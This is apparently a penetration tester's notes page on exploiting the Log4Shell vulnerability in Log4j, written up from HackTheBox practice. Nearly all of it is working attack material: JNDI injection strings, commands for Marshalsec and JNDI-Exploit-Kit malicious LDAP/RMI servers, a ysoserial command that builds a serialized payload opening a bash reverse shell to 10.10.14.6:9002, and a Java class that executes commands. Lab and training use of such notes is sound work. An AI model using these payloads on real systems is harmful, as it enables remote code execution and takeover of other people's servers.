---
title: Log4Shell
date: 2022-01-01
categories:
  - Notes
tags:
  - Log4j
  - ysoserial
  - marshalsec
excerpt_separator: <!--more-->
ShowToc: true
#image: Log4Shell.png
platform: notes.png
---

The widely-used java logging library, Log4j, has an unauthenticated remote code execution (RCE) and denial of service vulnerability if a user-controlled string is logged. This could allow the attacker full control of the affected server or allow an attacker to conduct a denial of service attack.


<!--more-->

## Log4shell

### Setting up LDAP server using Marshalsec
[Marshalsec Github](https://github.com/mbechler/marshalsec)
- `java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "https://10.10.10.10:8888/#log4jrce"`

### Payload
- `${jndi:ldap://10.10.14.2:1337/a}` 
- `${jndi:ldap://10.10.14.2:1337/${sys:java.class.path} or ${java:version} or ${java:os}}` **_or can be replaced with .... to do nested thingy_**

### Creating serialized payload using ysoserial
[ysoserial](https://github.com/frohoff/ysoserial) [ysoserial-modified](https://github.com/pimps/ysoserial-modified)
- `java -jar ysoserial-modified.jar CommonsCollections5 bash 'bash -i >& /dev/tcp/10.10.14.6/9002 0>&1' > ~/htb/logforge/ysoserial.ser` **_Creates a serialized payload_**

### Set up JNDI Listener using JNDI-Exploit-Kit
[JNDI-exploit-kit](https://github.com/pimps/JNDI-Exploit-Kit)
- `java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 10.10.14.6:1389 -P ~/htb/logforge/ysoserial.ser` **_Listens to port 1389 then sends ysoserial.ser_**
- after running ysoserial-modified we will get links for different versions for jdk to try out. `${jndi:ldap://10.10.14.6:1389/vojbuj}`

### Using ysoserial setup a JRMPListener that automatically sends CommonsCollections5 payload
- Using JRMPListener to send CommonsCollections `java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 1337 CommonsCollections5 "**_CMD_**"` **_this will set up a listener listening on port 1337. send your payload `${jndi:rmi://10.10.10.10:1337/a}` and should receive something._**

### Example Class
```Java 
public class Log4jRCE {
    static {
        try {
            String [] cmd={"touch", "/tmp/TEST"};
            java.lang.Runtime.getRuntime().exec(cmd).waitFor();
        }catch (Exception e){
            e.printStackTrace();
        }
    }
}
```

